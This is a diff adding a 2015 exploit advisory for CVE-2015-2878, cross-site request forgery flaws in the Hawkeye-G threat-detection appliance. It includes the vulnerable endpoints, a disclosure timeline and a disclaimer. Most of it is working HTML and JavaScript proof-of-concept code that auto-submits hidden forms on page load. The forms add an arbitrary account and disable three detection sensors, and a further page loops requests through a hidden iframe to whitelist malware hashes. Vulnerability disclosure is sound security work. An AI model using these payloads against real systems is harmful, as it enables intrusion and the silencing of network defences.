@@ -1,0 +1,250 @@
+# Exploit Title:  CSRF, Network Threat Appliance IDS / IPS
+# Google Dork: intitle: CSRF Network Threat Appliance IDS / IPS
+# Date: 2015-07-24
+# Exploit Author:  John Page ( hyp3rlinx )
+# Website: hyp3rlinx.altervista.org
+# Vendor Homepage: www.hexiscyber.com
+# Software Link:  www.hexiscyber.com/products/hawkeye-g
+# Version:  v3.0.1.4912
+# Tested on: windows 7 SP1
+# Category: Network Threat Appliance IDS / IPS
+
+
+
+Vulnerability Type:
+===================
+CSRF
+
+
+CVE Reference:
+==============
+CVE-2015-2878
+
+
+
+Vendor:
+===================
+www.hexiscyber.com
+
+
+
+Product:
+=====================================================================
+Hawkeye-G v3.0.1.4912
+
+Hawkeye G is an active defense disruptive technology that detects,
+investigates, remediates and removes cyber threats within the network.
+
+
+
+Advisory Information:
+====================================================
+
+Multiple CSRF(s) Vulnerabilities:
+
+
+Vulnerability Details:
+=====================
+
+1- CSRF Add arbitrary accounts to system
+------------------------------------
+
+vulnerable URL:
+https://localhost:8443/interface/rest/accounts/json
+
+vulnerable POST parameter:
+'name'
+
+
+2- CSRF modification of network sensor settings
+---------------------------------------------------------------------
+
+a) Turn off 'Url matching' Sensor
+b) Turn off 'DNS Inject' Sensor
+c) Turn off 'IP Redirect' Sensor
+
+vulnerable URL:
+https://localhost:8443/interface/rest/dpi/setEnabled/1
+
+vulnerable POST parameters:
+'url_match'
+'dns_inject'
+'ip_redirect'
+
+3- CSRF whitelisting of malware MD5 hash IDs
+------------------------------------------------------
+
+vulnerable URL:
+https://localhost:8443/interface/rest/md5-threats/whitelist
+
+vulnerable POST parameter 'id'
+
+
+
+CSRF Exploit code(s):
+====================
+
+
+<!DOCTYPE>
+<html>
+
+<script>
+
+/* Execute consecutive CSRF exploits */
+
+function ghostofsin(){
+ var doc=document;
+ var e1=doc.getElementById('exploit_1')
+ e1.submit()
+ var e2=doc.getElementById('exploit_2')
+  e2.submit()
+ var e3=doc.getElementById('exploit_3')
+  e3.submit()
+ var e4=doc.getElementById('exploit_4')
+  e4.submit()
+}
+</script>
+
+<body onLoad="ghostofsin()">
+
+<!-- Add arbitrary accounts -->
+<form id="exploit_1" action="
+https://localhost:8443/interface/rest/accounts/json" method="post">
+<input type="text" name="human" value="true" />
+<input type="text" name="name" value="inverted_crosses" />
+<input type="text" name="domainId" value=""/>
+<input type="text" name="domain_id" value="" />
+<input type="text" name="roving" value="false" />
+</form>
+
+
+<!-- shutdown the 'Url Matching' Sensor that
+is responsible for detecting known malware domains -->
+
+<form id="exploit_2" action="
+https://localhost:8443/interface/rest/dpi/setEnabled/1" method="post">
+<input type="text" name="level" value="1" />
+<input type="text" name="enable" value="false" />
+<input type="text" name="attribute" value="url_match"/>
+</form>
+
+<!-- set the DNS Inject Network Sensor to off -->
+
+<form id="exploit_3" action="
+https://localhost:8443/interface/rest/dpi/setEnabled/1" method="post">
+<input type="text" name="level" value="1" />
+<input type="text" name="enable" value="false" />
+<input type="text" name="attribute" value="dns_inject"/>
+</form>
+
+<!-- set the IP Redirect Network Sensor to off -->
+
+<form id="exploit_4" action="
+https://localhost:8443/interface/rest/dpi/setEnabled/1" method="post">
+<input type="text" name="level" value="1" />
+<input type="text" name="enable" value="false" />
+<input type="text" name="attribute" value="ip_redirect"/>
+</form>
+
+</body>
+</html>
+
+
+Whitelist MD5 malware IDs CSRF:
+-------------------------------
+
+In final CSRF POC to try an white list malware MD5 IDs will be a bit more
+complex,
+we need to submit form many times hidden in background using iframe so we
+stay on same page.
+Seems all MD5 ID's end in 0001 and are 8 bytes in length, we just need a
+loop an create some
+numbers 8 bytes long and dynamically assign the 'id' value of the field and
+execute multiple
+POST requests in background, it will be hit or miss unless you know ahead
+of time the MD5 ID
+in the database your targeting.
+
+e.g. Malware MD5 database ID 28240001
+
+So Here we go!...
+
+<!-- whitelist MD5 malware IDs -->
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>CSRF POC hyp3rlinx</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+<body>
+<form id="hell" action="
+https://localhost:8443/interface/rest/md5-threats/whitelist"
+target="demonica" method="post">
+<input type="hidden" name="id" id="id"><br>
+</form>
+<IFRAME style="display:none" name="demonica"></IFRAME>
+<script>
+var doc=document
+var x=1000
+exorcism()
+function exorcism(){
+ x++
+ String(x)
+ x+="0001"
+ var f=doc.getElementById('hell')
+ var e=doc.getElementById('id')
+ e.value=x
+  x=x.substr(0,4)
+ f.submit()
+ }
+ setInterval("exorcism()",100)
+</script>
+</body>
+</html>
+
+
+
+Disclosure Timeline:
+=========================================================
+Vendor Notification: June 30, 2015
+July 24, 2015 : Public Disclosure
+
+
+
+Severity Level:
+=========================================================
+High
+
+
+
+Description:
+==========================================================
+
+Request Method(s):              [+] POST
+
+
+Vulnerable Product:             [+] Hawkeye-G v3.0.1.4912
+
+
+Vulnerable Parameter(s):        [+] name, enable, id
+
+
+Affected Area(s):               [+] Network Threat Appliance, Local Domain
+
+
+============================================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+
+(hyp3rlinx)
